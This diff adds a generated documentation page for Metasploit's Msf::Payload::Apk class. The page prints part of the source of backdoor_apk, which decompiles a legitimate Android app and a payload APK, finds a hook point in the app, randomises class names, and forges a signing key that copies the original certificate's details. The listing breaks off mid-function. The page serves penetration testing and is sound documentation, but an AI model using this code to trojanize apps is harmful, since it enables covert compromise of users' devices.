@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Class: Msf::Payload::Apk
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Payload::Apk";
+  relpath = '../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../_index.html">Index (A)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Payload.html" title="Msf::Payload (class)">Payload</a></span></span>
+     &raquo; 
+    <span class="title">Apk</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Class: Msf::Payload::Apk
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+  <dl>
+    <dt>Inherits:</dt>
+    <dd>
+      <span class="inheritName">Object</span>
+      
+        <ul class="fullTree">
+          <li>Object</li>
+          
+            <li class="next">Msf::Payload::Apk</li>
+          
+        </ul>
+        <a href="#" class="inheritanceTree">show all</a>
+      
+    </dd>
+  </dl>
+  
+
+  
+  
+  
+  
+  
+
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/payload/apk.rb</dd>
+  </dl>
+  
+</div>
+
+
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#backdoor_apk-instance_method" title="#backdoor_apk (instance method)">#<strong>backdoor_apk</strong>(apkfile, raw_payload, signature = true, manifest = true, apk_data = nil, service = true)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#find_hook_point-instance_method" title="#find_hook_point (instance method)">#<strong>find_hook_point</strong>(amanifest)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Find a suitable smali point to hook.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#fix_manifest-instance_method" title="#fix_manifest (instance method)">#<strong>fix_manifest</strong>(tempdir, package, main_service, main_broadcast_receiver)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#parse_manifest-instance_method" title="#parse_manifest (instance method)">#<strong>parse_manifest</strong>(manifest_file)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#parse_orig_cert_data-instance_method" title="#parse_orig_cert_data (instance method)">#<strong>parse_orig_cert_data</strong>(orig_apkfile)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#print_error-instance_method" title="#print_error (instance method)">#<strong>print_error</strong>(msg = &#39;&#39;)  &#x21d2; Object </a>
+    
+
+    
+      (also: #print_bad)
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#print_status-instance_method" title="#print_status (instance method)">#<strong>print_status</strong>(msg = &#39;&#39;)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#run_cmd-instance_method" title="#run_cmd (instance method)">#<strong>run_cmd</strong>(cmd)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#usage-instance_method" title="#usage (instance method)">#<strong>usage</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="backdoor_apk-instance_method">
+  
+    #<strong>backdoor_apk</strong>(apkfile, raw_payload, signature = true, manifest = true, apk_data = nil, service = true)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245
+246
+247
+248
+249
+250
+251
+252
+253
+254
+255
+256
+257
+258
+259
+260
+261
+262
+263
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273
+274
+275
+276
+277
+278
+279
+280
+281
+282
+283
+284
+285
+286
+287
+288
+289
+290
+291
+292
+293
+294
+295
+296
+297
+298
+299
+300
+301</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/apk.rb', line 142</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_backdoor_apk'>backdoor_apk</span><span class='lparen'>(</span><span class='id identifier rubyid_apkfile'>apkfile</span><span class='comma'>,</span> <span class='id identifier rubyid_raw_payload'>raw_payload</span><span class='comma'>,</span> <span class='id identifier rubyid_signature'>signature</span> <span class='op'>=</span> <span class='kw'>true</span><span class='comma'>,</span> <span class='id identifier rubyid_manifest'>manifest</span> <span class='op'>=</span> <span class='kw'>true</span><span class='comma'>,</span> <span class='id identifier rubyid_apk_data'>apk_data</span> <span class='op'>=</span> <span class='kw'>nil</span><span class='comma'>,</span> <span class='id identifier rubyid_service'>service</span> <span class='op'>=</span> <span class='kw'>true</span><span class='rparen'>)</span>
+  <span class='kw'>unless</span> <span class='id identifier rubyid_apk_data'>apk_data</span> <span class='op'>||</span> <span class='id identifier rubyid_apkfile'>apkfile</span> <span class='op'>&amp;&amp;</span> <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_readable?'>readable?</span><span class='lparen'>(</span><span class='id identifier rubyid_apkfile'>apkfile</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_usage'>usage</span>
+    <span class='id identifier rubyid_raise'>raise</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Invalid template: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_apkfile'>apkfile</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_apktool'>apktool</span> <span class='op'>=</span> <span class='id identifier rubyid_run_cmd'>run_cmd</span><span class='lparen'>(</span><span class='qwords_beg'>%w[</span><span class='tstring_content'>apktool</span><span class='words_sep'> </span><span class='tstring_content'>-version</span><span class='tstring_end'>]</span></span><span class='rparen'>)</span>
+  <span class='kw'>unless</span> <span class='id identifier rubyid_apktool'>apktool</span> <span class='op'>!=</span> <span class='kw'>nil</span>
+    <span class='id identifier rubyid_raise'>raise</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>apktool not found. If it&#39;s not in your PATH, please add it.</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_apk_v'>apk_v</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../Rex/Version.html" title="Rex::Version (class)">Version</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../Rex/Version.html#initialize-instance_method" title="Rex::Version#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='id identifier rubyid_apktool'>apktool</span><span class='rparen'>)</span>
+  <span class='kw'>unless</span> <span class='id identifier rubyid_apk_v'>apk_v</span> <span class='op'>&gt;=</span> <span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../Rex/Version.html" title="Rex::Version (class)">Version</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../Rex/Version.html#initialize-instance_method" title="Rex::Version#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>2.0.1</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_raise'>raise</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>apktool version </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_apk_v'>apk_v</span><span class='embexpr_end'>}</span><span class='tstring_content'> not supported, please download at least version 2.0.1.</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+
+  <span class='comment'>#Create temporary directory where work will be done
+</span>  <span class='id identifier rubyid_tempdir'>tempdir</span> <span class='op'>=</span> <span class='const'>Dir</span><span class='period'>.</span><span class='id identifier rubyid_mktmpdir'>mktmpdir</span>
+  <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_binwrite'>binwrite</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/payload.apk</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_raw_payload'>raw_payload</span><span class='rparen'>)</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_apkfile'>apkfile</span>
+    <span class='const'>FileUtils</span><span class='period'>.</span><span class='id identifier rubyid_cp'>cp</span> <span class='id identifier rubyid_apkfile'>apkfile</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/original.apk</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>else</span>
+    <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_binwrite'>binwrite</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/original.apk</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_apk_data'>apk_data</span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_signature'>signature</span>
+    <span class='id identifier rubyid_keytool'>keytool</span> <span class='op'>=</span> <span class='id identifier rubyid_run_cmd'>run_cmd</span><span class='lparen'>(</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>keytool</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+    <span class='kw'>unless</span> <span class='id identifier rubyid_keytool'>keytool</span> <span class='op'>!=</span> <span class='kw'>nil</span>
+      <span class='id identifier rubyid_raise'>raise</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>keytool not found. If it&#39;s not in your PATH, please add it.</span><span class='tstring_end'>&quot;</span></span>
+    <span class='kw'>end</span>
+
+    <span class='id identifier rubyid_jarsigner'>jarsigner</span> <span class='op'>=</span> <span class='id identifier rubyid_run_cmd'>run_cmd</span><span class='lparen'>(</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>jarsigner</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+    <span class='kw'>unless</span> <span class='id identifier rubyid_jarsigner'>jarsigner</span> <span class='op'>!=</span> <span class='kw'>nil</span>
+      <span class='id identifier rubyid_raise'>raise</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>jarsigner not found. If it&#39;s not in your PATH, please add it.</span><span class='tstring_end'>&quot;</span></span>
+    <span class='kw'>end</span>
+
+    <span class='id identifier rubyid_zipalign'>zipalign</span> <span class='op'>=</span> <span class='id identifier rubyid_run_cmd'>run_cmd</span><span class='lparen'>(</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>zipalign</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+    <span class='kw'>unless</span> <span class='id identifier rubyid_zipalign'>zipalign</span> <span class='op'>!=</span> <span class='kw'>nil</span>
+      <span class='id identifier rubyid_raise'>raise</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>zipalign not found. If it&#39;s not in your PATH, please add it.</span><span class='tstring_end'>&quot;</span></span>
+    <span class='kw'>end</span>
+
+    <span class='id identifier rubyid_keystore'>keystore</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/signing.keystore</span><span class='tstring_end'>&quot;</span></span>
+    <span class='id identifier rubyid_storepass'>storepass</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>android</span><span class='tstring_end'>&quot;</span></span>
+    <span class='id identifier rubyid_keypass'>keypass</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>android</span><span class='tstring_end'>&quot;</span></span>
+    <span class='id identifier rubyid_keyalias'>keyalias</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>signing.key</span><span class='tstring_end'>&quot;</span></span>
+    <span class='id identifier rubyid_orig_cert_data'>orig_cert_data</span> <span class='op'>=</span> <span class='id identifier rubyid_parse_orig_cert_data'>parse_orig_cert_data</span><span class='lparen'>(</span><span class='id identifier rubyid_apkfile'>apkfile</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_orig_cert_dname'>orig_cert_dname</span> <span class='op'>=</span> <span class='id identifier rubyid_orig_cert_data'>orig_cert_data</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_orig_cert_startdate'>orig_cert_startdate</span> <span class='op'>=</span> <span class='id identifier rubyid_orig_cert_data'>orig_cert_data</span><span class='lbracket'>[</span><span class='int'>1</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_orig_cert_validity'>orig_cert_validity</span> <span class='op'>=</span> <span class='id identifier rubyid_orig_cert_data'>orig_cert_data</span><span class='lbracket'>[</span><span class='int'>2</span><span class='rbracket'>]</span>
+
+    <span class='id identifier rubyid_print_status'>print_status</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Creating signing key and keystore..\n</span><span class='tstring_end'>&quot;</span></span>
+    <span class='id identifier rubyid_run_cmd'>run_cmd</span><span class='lparen'>(</span><span class='lbracket'>[</span>
+      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>keytool</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-genkey</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-v</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-keystore</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_keystore'>keystore</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-alias</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_keyalias'>keyalias</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-storepass</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_storepass'>storepass</span><span class='comma'>,</span>
+      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-keypass</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_keypass'>keypass</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-keyalg</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>RSA</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-keysize</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>2048</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-startdate</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_orig_cert_startdate'>orig_cert_startdate</span><span class='comma'>,</span>
+      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-validity</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_orig_cert_validity'>orig_cert_validity</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-dname</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_orig_cert_dname'>orig_cert_dname</span>
+    <span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_print_status'>print_status</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Decompiling original APK..\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_run_cmd'>run_cmd</span><span class='lparen'>(</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>apktool</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>d</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/original.apk</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-o</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/original</span><span class='tstring_end'>&quot;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_print_status'>print_status</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Decompiling payload APK..\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_run_cmd'>run_cmd</span><span class='lparen'>(</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>apktool</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>d</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/payload.apk</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-o</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/payload</span><span class='tstring_end'>&quot;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_amanifest'>amanifest</span> <span class='op'>=</span> <span class='id identifier rubyid_parse_manifest'>parse_manifest</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/original/AndroidManifest.xml</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_print_status'>print_status</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Locating hook point..\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_hookable_class'>hookable_class</span> <span class='op'>=</span> <span class='id identifier rubyid_find_hook_point'>find_hook_point</span><span class='lparen'>(</span><span class='id identifier rubyid_amanifest'>amanifest</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_smalifile'>smalifile</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/original/smali*/</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='id identifier rubyid_hookable_class'>hookable_class</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>\.</span><span class='regexp_end'>/</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>/</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>.smali</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_smalifiles'>smalifiles</span> <span class='op'>=</span> <span class='const'>Dir</span><span class='period'>.</span><span class='id identifier rubyid_glob'>glob</span><span class='lparen'>(</span><span class='id identifier rubyid_smalifile'>smalifile</span><span class='rparen'>)</span>
+  <span class='kw'>for</span> <span class='id identifier rubyid_smalifile'>smalifile</span> <span class='kw'>in</span> <span class='id identifier rubyid_smalifiles'>smalifiles</span>
+    <span class='kw'>if</span> <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_readable?'>readable?</span><span class='lparen'>(</span><span class='id identifier rubyid_smalifile'>smalifile</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_hooksmali'>hooksmali</span> <span class='op'>=</span> <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_read'>read</span><span class='lparen'>(</span><span class='id identifier rubyid_smalifile'>smalifile</span><span class='rparen'>)</span>
+      <span class='kw'>break</span>
+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>unless</span> <span class='id identifier rubyid_hooksmali'>hooksmali</span>
+    <span class='id identifier rubyid_raise'>raise</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Unable to find hook point in </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_smalifile'>smalifile</span><span class='embexpr_end'>}</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_entrypoint'>entrypoint</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>return-void</span><span class='tstring_end'>&#39;</span></span>
+  <span class='kw'>unless</span> <span class='id identifier rubyid_hooksmali'>hooksmali</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span> <span class='id identifier rubyid_entrypoint'>entrypoint</span>
+    <span class='id identifier rubyid_raise'>raise</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Unable to find hookable function in </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_smalifile'>smalifile</span><span class='embexpr_end'>}</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+
+  <span class='comment'># Remove unused files
+</span>  <span class='const'>FileUtils</span><span class='period'>.</span><span class='id identifier rubyid_rm'>rm</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/payload/smali/com/metasploit/stage/MainActivity.smali</span><span class='tstring_end'>&quot;</span></span>
+  <span class='const'>FileUtils</span><span class='period'>.</span><span class='id identifier rubyid_rm'>rm</span> <span class='const'>Dir</span><span class='period'>.</span><span class='id identifier rubyid_glob'>glob</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/payload/smali/com/metasploit/stage/R*.smali</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_package'>package</span> <span class='op'>=</span> <span class='id identifier rubyid_amanifest'>amanifest</span><span class='period'>.</span><span class='id identifier rubyid_xpath'>xpath</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>//manifest</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_first'>first</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>package</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_package'>package</span> <span class='op'>=</span> <span class='id identifier rubyid_package'>package</span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>.</span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='op'>::</span><span class='id identifier rubyid_rand_text_alpha_lower'>rand_text_alpha_lower</span><span class='lparen'>(</span><span class='int'>5</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_classes'>classes</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span>
+  <span class='id identifier rubyid_classes'>classes</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='op'>::</span><span class='id identifier rubyid_rand_text_alpha_lower'>rand_text_alpha_lower</span><span class='lparen'>(</span><span class='int'>5</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_capitalize'>capitalize</span>
